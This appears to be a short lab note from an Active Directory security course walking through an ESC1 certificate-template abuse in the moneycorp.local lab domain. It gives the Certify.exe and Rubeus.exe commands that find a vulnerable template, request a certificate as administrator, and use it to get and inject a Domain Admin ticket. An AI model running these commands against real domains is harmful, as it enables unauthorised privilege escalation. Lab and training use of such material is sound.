* The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag.
```
Certify.exe find /enrolleeSuppliesSubject
```

* The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
```
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

* Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA)
```
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```

